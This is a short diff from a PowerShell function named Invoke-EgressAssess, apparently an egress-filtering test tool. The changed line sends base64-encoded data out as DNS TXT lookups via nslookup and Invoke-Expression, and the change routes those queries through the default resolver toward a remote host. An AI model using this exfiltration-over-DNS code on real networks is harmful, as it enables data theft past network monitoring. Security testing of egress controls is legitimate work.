@@ -1629,7 +1629,7 @@ function Invoke-EgressAssess
                             $DataToSend = $DNSData.Substring($ByteReader, $DefaultLength)
                             $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($DataToSend)
                             $EncodedData = [System.Convert]::ToBase64String($DataBytes)
-                            Invoke-Expression "nslookup.exe -type=txt -norecurse -retry=1 -timeout=1 $EncodedData.$IP $IP 2>&1" | Out-Null
+                            Invoke-Expression "nslookup.exe -type=txt -norecurse -retry=1 -timeout=1 $EncodedData.$IP 2>&1" | Out-Null
                             Write-Verbose "[*] Sending data .... $PacketNumber/$TotalPackets"
                             $PacketNumber += 1
                             $ByteReader += $DefaultLength
